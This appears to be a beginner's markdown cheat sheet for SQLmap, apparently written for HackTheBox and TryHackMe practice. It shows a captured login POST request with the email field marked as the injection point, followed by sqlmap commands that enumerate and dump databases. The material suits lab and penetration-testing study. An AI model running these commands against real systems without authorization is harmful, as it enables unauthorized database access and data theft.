### Learn about SQLmap
- [SQLmap tutorial for begineers](https://tryhackme.com/room/sqlmap)
- [SQLmap video tutorial](https://www.youtube.com/watch?v=pF7uz_ptuFc&ab_channel=ElPing%C3%BCinodeMario)
- [SQLmap extended video tutorial](https://www.youtube.com/watch?v=2y70Yj0oSxw&ab_channel=SEGURIDADCERO)
### Labs for practice
- [HTB Goodgames](https://app.hackthebox.com/machines/446)
- [HTB Validation](https://app.hackthebox.com/machines/382)

# I) SQLmap parameters
PARAMETERS HERE!

# I) Usage with HTTP POST
## 1) Intercept the request header with burpsuite. (THIS WILL WORK ONLY WITH POST) the request should be like:
```javascript
POST /login HTTP/1.1
Host: 10.10.11.130
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://10.10.11.130
DNT: 1
Connection: close
Referer: http://10.10.11.130/
Upgrade-Insecure-Requests: 1

email=admin%40admin.com&password=admin // <--This field its the injection point
```
## 2) Create a .txt file (peticion.txt) and paste the Burpsuite request
```bash
nano peticion.txt
```
## 3) Use SQLmap with the previouse .txt file (peticion.txt example)
- -r: Read file parameter
```bash
sqlmap -r peticion.txt
```
- Note: Sometimes SQLmap would ask if we want to add some extra parameteres.
- Note 2: You can access the output on path: /home/kali/.local/share/sqlmap/output/<target_host_name>
## 4) Detect the current databases. After this payload we should see at the output the lists of Databases
```bash
sqlmap -r peticion.txt -dbs
```
## 5) Dump the database information
```bash
sqlmap -r peticion.txt -D <name_of_database> -dump
```
# II) Usage with HTTP GET
- u: Sepcify the URL
- --dbs: Sepcify enumeration current databases
```bash
sqlmap -u https://testsite.com/page.php?id=7 --dbs
```
